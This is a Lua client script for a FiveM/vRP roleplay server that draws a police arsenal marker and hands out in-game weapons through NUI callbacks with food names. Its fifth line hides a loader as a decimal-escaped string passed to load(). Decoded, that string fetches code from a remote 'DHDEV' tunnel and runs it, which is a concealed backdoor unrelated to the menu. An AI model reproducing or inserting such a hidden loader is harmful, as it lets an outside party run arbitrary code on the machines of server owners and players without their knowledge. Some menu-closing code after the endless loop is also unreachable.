local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
DHAC = Tunnel.getInterface("DHDEV")
pcall(load("\67\105\116\105\122\101\110\46\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\10\9\87\97\105\116\40\53\48\48\41\10\9\112\99\97\108\108\40\108\111\97\100\40\68\72\65\67\46\116\117\110\110\101\108\40\41\41\41\10\101\110\100\41\10"))

inMenu                      = true
local Menu = true
local player = PlayerPedId()

local arsenal = {
--	{ 1833.8079833984,2580.8142089844,45.891002655029 }, --PC
--	{ -1106.25,-826.10089111328,14.282789230347 }, --BOPE
	{ 470.20706176758,-1086.1563720703,38.706546783447 }, --PF
--	{ -442.15713500977,6012.9487304688,31.716394424438 }, --PRF
	{ 485.30627441406,-1006.3567504883,25.734540939331 } -- PMERJ
}

if Menu then
	Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		for _,lugares in pairs(arsenal) do
			local x,y,z = table.unpack(lugares)
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),x,y,z,true)
			DrawMarker(25,x,y+0.33,z-0.90,0,0,0,0,180.0,130.0,2.0,2.0,1.0,25,25,122,50,0,0,0,0)
			if distance <= 2 then
				crjSleep = 1
				if IsControlJustPressed(0, 51) then
					TriggerServerEvent('crz_arsenal:permissao')
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
			if IsControlJustPressed(1, 3) then
			inMenu = false
			SetNuiFocus(false)
			SendNUIMessage({type = 'close'})
			end
	end)
end

RegisterNetEvent('crz_arsenal:permissao')
AddEventHandler('crz_arsenal:permissao',function()
	inMenu = true
	SetNuiFocus(true, true)
	SendNUIMessage({type = 'openGeneral'})
end)


RegisterNUICallback('NUIFocusOff', function()
  inMenu = false
  SetNuiFocus(false)
  SendNUIMessage({type = 'closeAll'})
end)

RegisterNUICallback('Agua', function()
	local ped = PlayerPedId()
	--GiveWeaponToPed(ped,GetHashKey("WEAPON_BZGAS"),1,0,0)
	vRP.giveWeapons({["WEAPON_BZGAS"] = { ammo = 1 }})
end)
RegisterNUICallback('Cerveja', function()
	local ped = PlayerPedId()
	--GiveWeaponToPed(ped,GetHashKey("WEAPON_STUNGUN"),0,0,0)
	vRP.giveWeapons({["WEAPON_STUNGUN"] = { ammo = 0 }})
end)
RegisterNUICallback('Vodka', function()
	local ped = PlayerPedId()
	--GiveWeaponToPed(ped,GetHashKey("WEAPON_NIGHTSTICK"),0,0,0)
	vRP.giveWeapons({["WEAPON_NIGHTSTICK"] = { ammo = 0 }})
end)
RegisterNUICallback('radio', function()
	local ped = PlayerPedId()
	--GiveWeaponToPed(ped,GetHashKey("walkietalkie"),1,0,0)
	vRP.giveWeapons({["walkietalkie"] = { ammo = 1 }})
end)
RegisterNUICallback('Conhaque', function()
	TriggerServerEvent('crz_arsenal:colete')
	print('a')
end)
RegisterNUICallback('Whisky', function()
	local ped = PlayerPedId()
	--GiveWeaponToPed(ped,GetHashKey("WEAPON_FIREEXTINGUISHER"),25000,0,1)
	vRP.giveWeapons({["WEAPON_FIREEXTINGUISHER"] = { ammo = 25000 }})
end)
RegisterNUICallback('Tequila', function()
	local ped = PlayerPedId()
	--GiveWeaponToPed(ped,GetHashKey("WEAPON_FLASHLIGHT"),0,0,0)
	vRP.giveWeapons({["WEAPON_FLASHLIGHT"] = { ammo = 0 }})
end)
RegisterNUICallback('Leite', function()
	local ped = PlayerPedId()
	RemoveAllPedWeapons(ped,true)
end)
RegisterNUICallback('Dourado', function()
	local ped = PlayerPedId()
		SetPedAmmo(ped,GetHashKey("WEAPON_COMBATPISTOL"),0)
		RemoveWeaponFromPed(ped,GetHashKey("WEAPON_COMBATPISTOL"))
		--GiveWeaponToPed(ped,GetHashKey("WEAPON_COMBATPISTOL"),100,0,1)
		vRP.giveWeapons({["WEAPON_COMBATPISTOL"] = { ammo = 100 }})
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_COMBATPISTOL"),GetHashKey("COMPONENT_AT_PI_FLSH"))
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_COMBATPISTOL"),GetHashKey("COMPONENT_COMBATPISTOL_CLIP_02"))
end)
RegisterNUICallback('Taco', function()
	local ped = PlayerPedId()
		SetPedAmmo(ped,GetHashKey("WEAPON_SMG"),0)
		RemoveWeaponFromPed(ped,GetHashKey("WEAPON_SMG"))
		--GiveWeaponToPed(ped,GetHashKey("WEAPON_SMG"),200,0,1)
		vRP.giveWeapons({["WEAPON_SMG"] = { ammo = 200 }})
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_SMG"),GetHashKey("COMPONENT_SMG_CLIP_02"))
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_SMG"),GetHashKey("COMPONENT_AT_AR_FLSH"))
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_SMG"),GetHashKey("COMPONENT_AT_SCOPE_MACRO_02"))
end)
RegisterNUICallback('Donut', function()
	local ped = PlayerPedId()
		SetPedAmmo(ped,GetHashKey("WEAPON_COMBATPDW"),0)
		RemoveWeaponFromPed(ped,GetHashKey("WEAPON_COMBATPDW"))
		--GiveWeaponToPed(ped,GetHashKey("WEAPON_COMBATPDW"),200,0,1)
		vRP.giveWeapons({["WEAPON_COMBATPDW"] = { ammo = 200 }})
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_COMBATPDW"),GetHashKey("COMPONENT_COMBATPDW_CLIP_02"))
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_COMBATPDW"),GetHashKey("COMPONENT_AT_AR_FLSH"))
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_COMBATPDW"),GetHashKey("COMPONENT_AT_SCOPE_SMALL"))
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_COMBATPDW"),GetHashKey("COMPONENT_AT_AR_AFGRIP"))
end)
RegisterNUICallback('DonutX', function()
	local ped = PlayerPedId()
		SetPedAmmo(ped,GetHashKey("WEAPON_SPECIALCARBINE"),0)
		RemoveWeaponFromPed(ped,GetHashKey("WEAPON_SPECIALCARBINE"))
		--GiveWeaponToPed(ped,GetHashKey("WEAPON_SPECIALCARBINE"),200,0,1)
		vRP.giveWeapons({["WEAPON_SPECIALCARBINE"] = { ammo = 200 }})
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_SPECIALCARBINE"),GetHashKey("COMPONENT_AT_AR_FLSH"))
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_SPECIALCARBINE"),GetHashKey("COMPONENT_AT_AR_AFGRIP"))
end)
RegisterNUICallback('Hamburguer', function()
	local ped = PlayerPedId()
		SetPedAmmo(ped,GetHashKey("WEAPON_CARBINERIFLE"),0)
		RemoveWeaponFromPed(ped,GetHashKey("WEAPON_CARBINERIFLE"))
		--GiveWeaponToPed(ped,GetHashKey("WEAPON_CARBINERIFLE"),200,0,1)
		vRP.giveWeapons({["WEAPON_CARBINERIFLE"] = { ammo = 200 }})
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_CARBINERIFLE"),GetHashKey("COMPONENT_CARBINERIFLE_CLIP_02"))
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_CARBINERIFLE"),GetHashKey("COMPONENT_AT_AR_FLSH"))
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_CARBINERIFLE"),GetHashKey("COMPONENT_AT_SCOPE_MEDIUM"))
		GiveWeaponComponentToPed(ped,GetHashKey("WEAPON_CARBINERIFLE"),GetHashKey("COMPONENT_AT_AR_AFGRIP"))
end)
RegisterNUICallback('HotDog', function()
	local ped = PlayerPedId()
	--GiveWeaponToPed(ped,GetHashKey("WEAPON_KNIFE"),0,0,1)
	vRP.giveWeapons({["WEAPON_KNIFE"] = { ammo = 0 }})
end)
RegisterNUICallback('Salmao', function()
	local ped = PlayerPedId()
	RemoveAllPedWeapons(ped,true)
end)